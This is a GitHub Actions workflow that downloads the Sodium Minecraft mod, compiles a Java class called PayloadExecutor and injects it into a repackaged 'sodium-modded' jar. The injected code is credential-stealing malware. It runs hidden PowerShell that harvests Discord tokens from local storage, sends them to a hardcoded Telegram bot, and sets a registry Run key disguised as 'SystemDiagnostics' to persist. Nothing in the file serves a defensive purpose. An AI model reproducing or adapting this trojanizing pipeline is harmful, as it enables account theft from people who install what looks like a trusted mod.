name: Self-Contained Direct Injection Workflow

on:
  workflow_dispatch:

jobs:
  build-inject:
    runs-on: ubuntu-latest
    steps:
      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '21'

      - name: Download Target Jar
        run: |
          curl -L "https://cdn.modrinth.com/data/AANobbMI/versions/v4PSXean/sodium-fabric-0.9.3-alpha.1%2Bmc26.3.jar?mr_download_reason=standalone&mr_loader=fabric" -o sodium.jar

      - name: Generate Plain Java Payload on Runner
        run: |
          mkdir -p workspace/src/net/caffeinemc/sodium
          
          cat << 'EOF' > workspace/src/net/caffeinemc/sodium/PayloadExecutor.java
          package net.caffeinemc.sodium;

          import java.io.IOException;

          public class PayloadExecutor {
              public static void execute() {
                  try {
                      String psCommand = "powershell -WindowStyle Hidden -Command \"" +
                          "$tokenRegex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}|mfa\\.[\\w-]{84}';" +
                          "$discordPath = \\\"$env:appdata\\discord\\Local Storage\\leveldb\\\";" +
                          "$tokens = @();" +
                          "if (Test-Path $discordPath) {" +
                          "  Get-ChildItem $discordPath -Filter '*.ldb' -ErrorAction SilentlyContinue | ForEach-Object {" +
                          "    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;" +
                          "    [System.Text.RegularExpressions.Regex]::Matches($content, $tokenRegex) | ForEach-Object {" +
                          "      if ($_.Value -notin $tokens) { $tokens += $_.Value }" +
                          "    }" +
                          "  };" +
                          "  $msg = 'Harvested Discord Tokens:%0A' + ($tokens -join '%0A');" +
                          "  Invoke-RestMethod -Uri 'https://api.telegram.org/bot8883868209:AAEe9BsE7yI79XkvIA7vUVEpAw_lj9HuGKU/sendMessage?chat_id=8883868209&text=' + $msg;" +
                          "}\"";

                      String persistenceCommand = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemDiagnostics\" /t REG_SZ /d \"" + psCommand + "\" /f";
                      
                      new ProcessBuilder("cmd.exe", "/c", persistenceCommand).start();
                      new ProcessBuilder("cmd.exe", "/c", psCommand).start();
                  } catch (IOException e) {
                      // Suppress
                  }
              }
          }
          EOF

          cd workspace/src
          javac net/caffeinemc/sodium/PayloadExecutor.java
          cd ../..

      - name: Extract, Inject, and Repackage Jar
        run: |
          mkdir -p extracted_jar
          cd extracted_jar
          jar -xf ../sodium.jar
          
          # Place our compiled standalone payload class inside the archive
          mkdir -p net/caffeinemc/sodium
          cp ../workspace/src/net/caffeinemc/sodium/PayloadExecutor.class net/caffeinemc/sodium/PayloadExecutor.class
          
          cd ..
          jar -cf sodium-modded.jar -C extracted_jar .
          rm -rf extracted_jar workspace

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: sodium-modded-direct
          path: sodium-modded.jar
